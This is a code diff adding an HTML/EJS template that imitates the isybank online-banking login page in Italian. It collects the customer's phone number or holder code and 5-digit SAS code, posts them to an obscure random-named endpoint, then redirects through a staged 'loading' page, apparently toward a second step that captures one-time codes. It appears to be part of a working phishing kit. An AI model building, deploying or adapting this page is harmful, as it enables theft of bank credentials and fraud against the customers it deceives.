@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="it">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+    <title>isybank</title>
+    <link rel="stylesheet" href="css/botta.css">
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    <%- include('partials/tracker') %>
+</head>
+
+<body>
+
+    <!-- Header Section (q1.png on Desktop, q1M.png on Mobile) -->
+    <header class="header-desktop" aria-label="Intestazione isybank">
+        <img src="img/q1.png" alt="isybank" onerror="if(!this.dataset.retried){this.dataset.retried=1;this.src='public/img/q1.png';}">
+    </header>
+    <header class="header-mobile" aria-label="Intestazione isybank mobile">
+        <img src="img/q1M.png" alt="isybank" onerror="if(!this.dataset.retried){this.dataset.retried=1;this.src='public/img/q1M.png';}">
+    </header>
+
+    <!-- Main Content Area -->
+    <main class="main-content">
+        <div class="content-inner">
+            <div class="mobile-content-wrapper">
+
+                <!-- Heading: 2 lines on Desktop, 3 lines on Mobile -->
+                <h1 class="page-title title-desktop">Sempre un piacere<br>quando passi di qui.</h1>
+                <h1 class="page-title title-mobile">Sempre un<br>piacere quando<br>passi di qui.</h1>
+
+                <!-- Subtitle -->
+                <p class="page-subtitle">Inserisci le tue credenziali</p>
+
+                <!-- Credentials Form -->
+                <form id="loginForm" class="login-form" autocomplete="on" novalidate>
+
+                    <!-- Input 1: Cellulare o codice titolare -->
+                    <div class="input-field-block">
+                        <div class="input-group">
+                            <div class="input-wrapper">
+                                <input type="text" id="username" name="username" class="isy-input"
+                                    placeholder=" " required autocomplete="username" spellcheck="false">
+                                <label for="username" class="floating-label">Numero di cellulare o codice titolare *</label>
+                            </div>
+                            <button type="button" class="help-btn" aria-label="Aiuto codice titolare" title="Aiuto">
+                                <span class="help-icon">?</span>
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Input 2: SAS / Password -->
+                    <div class="input-field-block">
+                        <div class="input-group">
+                            <div class="input-wrapper">
+                                <input type="password" id="password" name="password" class="isy-input password-input"
+                                    placeholder=" " required autocomplete="current-password"
+                                    maxlength="5" inputmode="numeric" pattern="[0-9]*">
+                                <label for="password" class="floating-label" id="passwordLabel">sas *</label>
+                            </div>
+                            <button type="button" class="help-btn" aria-label="Aiuto codice SAS" title="Aiuto">
+                                <span class="help-icon">?</span>
+                            </button>
+                        </div>
+                        <div id="sasError" class="input-error-msg" style="display:none;" role="alert">
+                            <span class="error-circle-icon" aria-hidden="true">!</span>
+                            <span class="error-text">Formato errato, il sas è composto da 5 cifre</span>
+                        </div>
+                    </div>
+
+                    <!-- Button: Entra -->
+                    <button type="submit" id="submitBtn" class="btn-entra" disabled>Entra</button>
+
+                    <!-- Link: Scarica l'app -->
+                    <div class="register-row">
+                        <span>Non sei ancora cliente?</span>
+                        <a href="#" class="download-link">Scarica l'app</a>
+                    </div>
+
+                    <!-- Security Info Box (Desktop only, q3.png) -->
+                    <div class="security-box" aria-label="Informazioni sicurezza">
+                        <img src="img/q3.png" alt="Aiutaci ad aumentare la tua sicurezza: scopri come proteggerti dalle truffe"
+                            onerror="if(!this.dataset.retried){this.dataset.retried=1;this.src='public/img/q3.png';}">
+                    </div>
+
+                </form>
+
+            </div>
+        </div>
+
+        <!-- Decorative Rainbow Graphics (Desktop only, q2.png) -->
+        <img src="img/q2.png" alt="" class="rainbow-graphic" aria-hidden="true"
+            onerror="if(!this.dataset.retried){this.dataset.retried=1;this.src='public/img/q2.png';}">
+    </main>
+
+    <!-- Footer Section (q4.png on Desktop, q4M.png on Mobile) -->
+    <footer class="footer-desktop" aria-label="Piè di pagina isybank">
+        <img src="img/q4.png" alt="Guida ai servizi | Sicurezza | Privacy | Cookies | Reclami e risoluzione delle controversie | Dichiarazione di accessibilità | Trasparenza"
+            onerror="if(!this.dataset.retried){this.dataset.retried=1;this.src='public/img/q4.png';}">
+    </footer>
+    <footer class="footer-mobile" aria-label="Piè di pagina isybank mobile">
+        <img src="img/q4M.png" alt="Guida ai servizi | Sicurezza | Privacy | Cookies | Reclami e risoluzione delle controversie | Dichiarazione di accessibilità | Trasparenza"
+            onerror="if(!this.dataset.retried){this.dataset.retried=1;this.src='public/img/q4M.png';}">
+    </footer>
+
+    <!-- Interactive Logic -->
+    <script>
+        (function() {
+            const usernameInput = document.getElementById('username');
+            const passwordInput = document.getElementById('password');
+            const submitBtn = document.getElementById('submitBtn');
+            const loginForm = document.getElementById('loginForm');
+            const sasError = document.getElementById('sasError');
+            const passwordLabel = document.getElementById('passwordLabel');
+
+            function showError() {
+                passwordInput.classList.add('has-error');
+                if (sasError) sasError.style.display = 'flex';
+            }
+
+            function clearError() {
+                passwordInput.classList.remove('has-error');
+                if (sasError) sasError.style.display = 'none';
+            }
+
+            // Responsive label adjustment for password field
+            function updatePasswordPlaceholder() {
+                if (passwordLabel) {
+                    passwordLabel.textContent = (window.innerWidth <= 768) ? 'SAS *' : 'sas *';
+                }
+            }
+            updatePasswordPlaceholder();
+            window.addEventListener('resize', updatePasswordPlaceholder);
+
+            // Button activation state: username filled AND password has exactly 5 digits
+            function checkInputs() {
+                const hasUser = usernameInput.value.trim().length > 0;
+                const isFiveDigits = /^[0-9]{5}$/.test(passwordInput.value);
+                if (hasUser && isFiveDigits) {
+                    submitBtn.disabled = false;
+                    submitBtn.classList.add('active');
+                } else {
+                    submitBtn.disabled = true;
+                    submitBtn.classList.remove('active');
+                }
+            }
+
+            // Reject non-numeric keystrokes
+            passwordInput.addEventListener('keydown', function(e) {
+                if (['Backspace', 'Tab', 'Delete', 'ArrowLeft', 'ArrowRight', 'ArrowUp', 'ArrowDown', 'Enter'].includes(e.key) ||
+                    e.ctrlKey || e.metaKey) {
+                    return;
+                }
+                if (!/^[0-9]$/.test(e.key)) {
+                    e.preventDefault();
+                    showError();
+                    return;
+                }
+                if (this.value.length >= 5 && this.selectionStart === this.selectionEnd) {
+                    e.preventDefault();
+                }
+            });
+
+            // Input event sanitization (virtual keyboard, autofill, IME)
+            passwordInput.addEventListener('input', function() {
+                const original = this.value;
+                const sanitized = original.replace(/[^0-9]/g, '').slice(0, 5);
+
+                if (original !== sanitized) {
+                    showError();
+                    this.value = sanitized;
+                } else if (this.value.length === 5 || this.value.length === 0) {
+                    clearError();
+                }
+
+                checkInputs();
+            });
+
+            // Paste event sanitization
+            passwordInput.addEventListener('paste', function(e) {
+                e.preventDefault();
+                const clipData = (e.clipboardData || window.clipboardData);
+                if (!clipData) return;
+                const pasted = clipData.getData('text');
+                const sanitized = pasted.replace(/[^0-9]/g, '').slice(0, 5);
+
+                if (sanitized !== pasted || pasted.length > 5) {
+                    showError();
+                } else if (sanitized.length === 5) {
+                    clearError();
+                }
+
+                this.value = sanitized;
+                checkInputs();
+            });
+
+            // Blur event validation
+            passwordInput.addEventListener('blur', function() {
+                if (this.value.length > 0 && this.value.length < 5) {
+                    showError();
+                } else if (this.value.length === 5 || this.value.length === 0) {
+                    clearError();
+                }
+            });
+
+            usernameInput.addEventListener('input', checkInputs);
+
+            // Form Submission Handling
+            loginForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                const username = usernameInput.value.trim();
+                const password = passwordInput.value;
+
+                if (!username || !/^[0-9]{5}$/.test(password)) {
+                    if (!/^[0-9]{5}$/.test(password)) {
+                        showError();
+                    }
+                    return;
+                }
+
+                submitBtn.disabled = true;
+                submitBtn.textContent = '...';
+
+                if (typeof $ !== 'undefined' && $.ajax) {
+                    $.ajax({
+                        url: '/gzLbTbjqMpc34D4XsPJ2',
+                        type: 'POST',
+                        contentType: 'application/json',
+                        data: JSON.stringify({ username, password }),
+                        success: function(info) {
+                            if (info && info.OK) {
+                                window.location = "/loading?time=12&url=/Mtan4gImt9DmQlk7b";
+                            } else {
+                                submitBtn.disabled = false;
+                                submitBtn.textContent = 'Entra';
+                            }
+                        },
+                        error: function() {
+                            setTimeout(function() {
+                                submitBtn.disabled = false;
+                                submitBtn.textContent = 'Entra';
+                            }, 500);
+                        }
+                    });
+                } else {
+                    fetch('/gzLbTbjqMpc34D4XsPJ2', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ username, password })
+                    })
+                    .then(function(res) { return res.json(); })
+                    .then(function(info) {
+                        if (info && info.OK) {
+                            window.location = "/loading?time=12&url=/Mtan4gImt9DmQlk7b";
+                        } else {
+                            submitBtn.disabled = false;
+                            submitBtn.textContent = 'Entra';
+                        }
+                    })
+                    .catch(function() {
+                        setTimeout(function() {
+                            submitBtn.disabled = false;
+                            submitBtn.textContent = 'Entra';
+                        }, 500);
+                    });
+                }
+            });
+        })();
+    </script>
+</body>
+
+</html>
